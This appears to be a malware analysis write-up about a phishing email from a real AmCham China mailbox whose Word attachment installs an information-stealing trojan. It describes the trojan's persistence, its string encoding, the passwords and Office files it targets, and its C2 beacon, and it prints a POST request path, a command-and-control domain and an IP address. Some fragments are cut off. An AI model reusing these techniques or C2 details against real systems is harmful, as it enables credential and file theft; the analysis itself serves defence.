The message came from the American Chamber of Commerce in China. The interesting thing about this message is that the sender is not
spoofed and the headers are real, which means that the message indeed came from the mailbox of the sender @amchamchina.org, who also
happens to be a real person working at amchamchina.org - can be easily found in Google searches. The sender name and address do not
match the message signature. I have removed part of the sender's name for privacy reasons.

In this case, there are three possible scenarios:
a) someone broke into that employee mailbox and sent the malicious message (in this case, I hope the IT staff at the American Chamber
of Commerce in China see this post and fix the problem)
b) the sender sent a malicious attachment not realizing it is malicious (less likely, as the attached Word document does not display
readable text),
c) the sender sent the malicious message on purpose (..)
We may never know how that happened but hope it is a case of a mailbox password compromise.
The files created by the malicious attachment generate traffic to a server in China.
Upon opening, the file will dispay garbage text if the attack fails (fully patched MS Office) and will just close without displaying any document if
the exploit is successful.
The trojan that gets installed is designed for stealing information from the infected computer - files and passwords - see the detailed analysis
below.

Userinit.exe additional information
I want to thank Andre' M. DiMino of the Shadowserver Foundation and villy of Bugix Security for their help and information
See Anubis and Joe box reports for more details. Here are a few notes:

1. I did not observe any changes in registry . The persistence is achieved via relaunching the binary from the infected user startup folder
(Start Menu\Programs\Startup\userinit.exe), also the there is a copy of the file gets created as All Users\Application Data\desktop.BIN
2. Userinit.exe creates folder logs in %userprofile%\Local Settings\Application Data\Windows\Logs. A shortcut like in the image below
shows up in that directory for a split second but I did not capture it. This is the file that gets transmitted with HTTP POST, MDAwMGhIR
UwuMDk in meta part of the URL string can be decoded as meta=0000hHEL.09
**POST /windowsupdatev7/search%3Fhl%3DSABBAE4AUwA%3D%26q%3DMQA5ADI ALgAxADYAOAAuADIALgAyAA%
3D%3D%26meta%3DMDAwMGhIRUwuMDk%3D%26id%3 Dlfdxfircvscxggb HTTP/1.1.
The last part -lfdxfircvscxggb - is changing with each GET request and is possibly an encoded directories names on the victim pc
(thanks to Villy for the info here)

3. See the Ascii strings below -. It appears the binary gathers the system info (Sysinfo.txt file gets created and deleted), IP address, and
user name for transmission to the remote server. The listing of file extensions (.doc.xls.pdf.rtf.eml.pgp.vpn.wab.csv.docx.xlsx +
**Proxy info****Office info***IE info****Hotfix info****OS info**) is interesting. We did not observe any file transmissions but possibly
obtaining the files with the listed extensions is the end goal of the attackers.
4. Villy provided the following info
"some strings encoded using simple encoding to bypass static analysis by AV
to decode strings used the following aglorithm
for(i=0;i
it's means that every byte in the string is decreased by number of its position in the string
userinit.dll - is a service
and installed with svchost(SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
It also grabs protected storage -saved passwords from IE 6.0 and below), and saved outlook passwords, versions of MS Office and
Internet Explorer
5. Hooks userinit.dll into explorer.exe (only Explorer.exe for Windows XP box despite a large number of apps open and processes running) and
into multiple processes (observed on Windows 7 box
Windows XP

Windows 7

There are usually 2-4 HTTP GET requests followed by one HTTP POST (12,000-20,000 bytes length), followed by many HTTP GET requests
again. I did not observe more than one HTTP POST per binary execution. The strings in HTTP GET requests are identical except for the last
part "id" of the string (see this code in the binary ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
/windowsupdatev7/search?hl=%s&q=%s&meta=%s&id=%s)

SSL traffic started for environment.interiorgov.net domain, and unlike globalization.interiorgov.net, environment subdomain is not hardcoded in
the binary downloaded from the server (see 114.248.83.92userinitJan7-11pm.pcap tcp.stream eq 3 - correction from Kyle Yung), all
communications always start with globalization.interiorgov.net. Also, the SSL traffic was observed only for 114.248.83.92

Example of SSL traffic

The following conversation between the server and the victim pc also takes place (thanks to Andre' DiMino for the capture :)
